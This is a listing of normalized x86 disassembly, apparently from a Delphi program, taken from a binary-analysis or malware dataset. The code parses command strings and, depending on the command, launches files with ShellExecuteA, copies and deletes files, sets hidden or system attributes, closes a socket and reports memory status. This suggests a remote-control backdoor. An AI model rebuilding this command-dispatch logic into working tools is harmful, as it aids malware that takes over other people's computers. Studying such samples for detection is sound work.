call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x274 ]
call sub_46d854
mov ecx [ ebp - 0x274 ]
lea eax [ ebp - 0x270 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x270 ]
call sub_475e2c
lea eax [ ebp - 0x280 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x280 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x27c ]
call sub_488be0
mov ecx [ ebp - 0x27c ]
lea eax [ ebp - 0x278 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x278 ]
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea edx [ ebp - 0x284 ]
mov eax [ ebp - 0xc ]
call sub_46d400
mov eax [ ebp - 0x284 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_475fd8
pop ecx
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x28c ]
xor eax eax
call sub_48adcc
mov ecx [ ebp - 0x28c ]
lea eax [ ebp - 0x288 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x288 ]
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x294 ]
mov eax 0x5
call sub_48adcc
mov ecx [ ebp - 0x294 ]
lea eax [ ebp - 0x290 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x290 ]
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call closesocket
mov eax r-xdata
call sub_483f50
test eax eax
jg r-xdata
lea eax [ ebp - 0x2a8 ]
push eax
mov ecx 0x12
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2a8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x298 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x298 ]
mov edx r-xdata
call sub_405974
je r-xdata
mov eax r-xdata
call sub_483f50
call sub_484388
call GetCurrentProcessId
call sub_484388
lea eax [ ebp - 0x2ac ]
push eax
mov ecx 0xf
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2ac ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x12
mov edx 0x1
call sub_405a84
xor ecx ecx
mov edx [ ebp - 0x8 ]
xor eax eax
call sub_48a218
test al al
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push [ eax ]
push r-xdata
lea eax [ ebp - 0x2a4 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x2a4 ]
call sub_46d36c
push r-xdata
lea edx [ ebp - 0x2a0 ]
xor eax eax
call sub_40f234
push [ ebp - 0x2a0 ]
push r-xdata
lea eax [ ebp - 0x29c ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x29c ]
call sub_46d36c
jmp r-xdata
lea eax [ ebp - 0x2bc ]
push eax
mov ecx 0x11
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2bc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xf
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
lea edx [ ebp - 0x2b0 ]
mov eax [ ebp - 0xc ]
call sub_409b7c
cmp [ ebp - 0x2b0 ] 0x0
je r-xdata
mov eax r-xdata
call sub_475e2c
call GetCurrentProcessId
call sub_484388
lea eax [ ebp - 0x2cc ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2cc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x11
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
lea edx [ ebp - 0x2c0 ]
mov eax [ ebp - 0xc ]
call sub_409b7c
cmp [ ebp - 0x2c0 ] 0x0
je r-xdata
push 0x5
lea edx [ ebp - 0x2b8 ]
mov eax [ ebp - 0xc ]
call sub_40a5a0
mov eax [ ebp - 0x2b8 ]
call sub_4059dc
push eax
push 0x0
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
cmp eax 0x20
ja r-xdata
push 0x5
lea edx [ ebp - 0x2b4 ]
mov eax [ ebp - 0xc ]
call sub_40a5a0
mov eax [ ebp - 0x2b4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
cmp eax 0x20
ja r-xdata
lea eax [ ebp - 0x2d0 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2d0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x7
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_409edc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_48a2c0
push 0x0
lea edx [ ebp - 0x2c8 ]
mov eax [ ebp - 0xc ]
call sub_40a5a0
mov eax [ ebp - 0x2c8 ]
call sub_4059dc
push eax
push 0x0
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
cmp eax 0x20
ja r-xdata
push 0x0
lea edx [ ebp - 0x2c4 ]
mov eax [ ebp - 0xc ]
call sub_40a5a0
mov eax [ ebp - 0x2c4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
cmp eax 0x20
ja r-xdata
mov eax r-xdata
call sub_475e2c
mov eax r-xdata
call sub_475e2c
jmp r-xdata
lea eax [ ebp - 0x2d4 ]
push eax
mov ecx 0x10
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2d4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_409edc
dec eax
jle r-xdata
mov eax r-xdata
call sub_475e2c
mov eax r-xdata
call sub_475e2c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x10
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_409edc
dec eax
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call DeleteFileA
mov eax [ ebp - 0x8 ]
call sub_409edc
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x2d8 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2d8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_48a46c
mov eax [ ebp - 0xc ]
call sub_48a3c8
mov eax [ ebp - 0x8 ]
call sub_409edc
mov ebx eax
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
lea eax [ ebp - 0x2dc ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2dc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
push 0x80
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
inc ebx
xor esi esi
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
call DeleteFileA
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call DeleteFileA
jmp r-xdata
lea eax [ ebp - 0x2e0 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2e0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
push 0x2
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x10 ]
call sub_48a3c8
mov eax [ ebp - 0xc ]
call sub_48a3c8
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_409edc
cmp esi eax
jne r-xdata
jmp r-xdata
inc esi
dec ebx
jne r-xdata
lea eax [ ebp - 0x2e4 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2e4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
push 0x1
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
mov eax [ ebp - 0x8 ]
call sub_409edc
cmp esi eax
jne r-xdata
jmp r-xdata
inc esi
dec ebx
jne r-xdata
lea eax [ ebp - 0x2e8 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2e8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
push 0x4
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
lea eax [ ebp - 0x2ec ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2ec ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
push 0x20
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
lea eax [ ebp - 0x2f0 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2f0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
push 0x100
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
lea eax [ ebp - 0x2f8 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2f8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
lea ecx [ ebp - 0x198 ]
mov edx 0x3f
mov eax [ ebp - 0x8 ]
call sub_40a488
mov ebx [ ebp - 0x188 ]
test ebx 0x2
jle r-xdata
lea eax [ ebp - 0x344 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x344 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x348 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x348 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
call sub_405584
lea eax [ ebp - 0xc ]
push eax
mov edx [ rw-data ]
mov edx [ edx ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0x1
call sub_405a44
mov edx [ rw-data ]
mov edx [ edx ]
mov eax r-xdata
call sub_405b28
mov ecx eax
mov eax [ rw-data ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x2fc ]
push eax
mov edx [ rw-data ]
mov edx [ edx ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0x1
call sub_405a44
mov eax [ ebp - 0x2fc ]
call sub_409edc
mov esi eax
mov edx [ rw-data ]
mov edx [ edx ]
mov eax r-xdata
call sub_405b28
mov ecx eax
mov eax [ rw-data ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4055c8
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
test ebx 0x1
jle r-xdata
lea eax [ ebp - 0x34c ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x34c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
push 0x0
call CoInitialize
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46e3f0
call CoUninitialize
cmp esi 0x1
jle r-xdata
cmp esi 0x1
jle r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
test ebx 0x20
jle r-xdata
lea eax [ ebp - 0x354 ]
push eax
mov ecx 0x8
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x354 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
lea edx [ ebp - 0x350 ]
mov eax [ ebp - 0xc ]
call sub_40a5a0
lea eax [ ebp - 0x350 ]
mov edx [ ebp - 0x10 ]
call sub_405818
mov edx [ ebp - 0x350 ]
mov eax [ ebp - 0xc ]
call sub_46da2c
test al al
jne r-xdata
push 0xffffffff
lea edx [ ebp - 0x340 ]
mov eax [ ebp - 0xc ]
call sub_40a68c
mov ecx [ ebp - 0x340 ]
lea eax [ ebp - 0x33c ]
mov edx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x33c ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call CopyFileA
mov ebx esi
test ebx ebx
jle r-xdata
push 0xffffffff
lea edx [ ebp - 0x320 ]
mov eax [ ebp - 0xc ]
call sub_40a68c
mov ecx [ ebp - 0x320 ]
lea eax [ ebp - 0x31c ]
mov edx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x31c ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call CopyFileA
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call DeleteFileA
jmp r-xdata
mov ebx esi
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
test ebx 0x4
jle r-xdata
lea eax [ ebp - 0x358 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x358 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x8
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46da2c
test al al
jne r-xdata
mov eax r-xdata
call sub_475e2c
mov eax [ rw-data ]
call sub_405530
mov eax r-xdata
call sub_475e2c
mov edi 0x1
mov edi 0x1
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
lea eax [ ebp - 0x2f4 ]
mov edx 0xc
call sub_4058e0
mov eax [ ebp - 0x2f4 ]
call sub_475e2c
lea eax [ ebp - 0x360 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x360 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
mov eax r-xdata
call sub_475e2c
push 0xffffffff
lea edx [ ebp - 0x338 ]
mov eax [ ebp - 0xc ]
call sub_40a68c
mov ecx [ ebp - 0x338 ]
lea eax [ ebp - 0x334 ]
mov edx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x334 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call CopyFileA
push 0xffffffff
lea eax [ ebp - 0x32c ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov eax [ ebp - 0x32c ]
lea edx [ ebp - 0x328 ]
call sub_40a68c
mov ecx [ ebp - 0x328 ]
lea eax [ ebp - 0x324 ]
mov edx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x324 ]
call sub_4059dc
push eax
lea eax [ ebp - 0x330 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov eax [ ebp - 0x330 ]
call sub_4059dc
push eax
call CopyFileA
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
jmp r-xdata
push 0xffffffff
lea edx [ ebp - 0x318 ]
mov eax [ ebp - 0xc ]
call sub_40a68c
mov ecx [ ebp - 0x318 ]
lea eax [ ebp - 0x314 ]
mov edx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x314 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call CopyFileA
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call DeleteFileA
push 0xffffffff
lea eax [ ebp - 0x308 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov eax [ ebp - 0x308 ]
lea edx [ ebp - 0x304 ]
call sub_40a68c
mov ecx [ ebp - 0x304 ]
lea eax [ ebp - 0x300 ]
mov edx [ ebp - 0x8 ]
call sub_405864
mov eax [ ebp - 0x300 ]
call sub_4059dc
push eax
lea eax [ ebp - 0x30c ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov eax [ ebp - 0x30c ]
call sub_4059dc
push eax
call CopyFileA
lea eax [ ebp - 0x310 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_405a44
mov eax [ ebp - 0x310 ]
mov [ ebp - 0x1bc ] eax
mov eax [ ebp - 0x1bc ]
call sub_4059dc
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1bd ] al
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
jmp r-xdata
lea eax [ ebp - 0x368 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x368 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x6
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_48c618
test al al
jne r-xdata
lea eax [ ebp - 0x35c ]
push eax
mov ecx ebx
mov edx 0x7
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x35c ]
call sub_46da10
test al al
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
cmp esi edi
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
cmp esi edi
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x36c ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x36c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
push 0x2
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
mov eax r-xdata
call sub_475e2c
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x364 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x364 ]
call sub_46d36c
mov eax r-xdata
call sub_475e2c
mov eax r-xdata
call sub_475e2c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
push 0x80
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call SetFileAttributesA
lea eax [ ebp - 0x384 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x384 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x1fc ]
push eax
call GlobalMemoryStatus
push r-xdata
call sub_46e5b0
lea edx [ ebp - 0x374 ]
call sub_409d70
push [ ebp - 0x374 ]
push r-xdata
lea eax [ ebp - 0x378 ]
push eax
mov eax [ ebp - 0x1f8 ]
mov [ ebp - 0x380 ] eax
mov [ ebp - 0x37c ] 0x0
lea edx [ ebp - 0x380 ]
xor ecx ecx
mov eax r-xdata
call sub_40af98
push [ ebp - 0x378 ]
lea eax [ ebp - 0x370 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x370 ]
call sub_475e2c
lea eax [ ebp - 0x390 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x390 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x38c ]
call sub_46e724
mov ecx [ ebp - 0x38c ]
lea eax [ ebp - 0x388 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x388 ]
call sub_475e2c
lea eax [ ebp - 0x398 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x398 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
push ebp
lea eax [ ebp - 0x394 ]
call sub_4846bc
mov eax [ ebp - 0x394 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_475fd8
pop ecx
lea eax [ ebp - 0x3a0 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x3a0 ]
mov edx r-xdata
call sub_405974
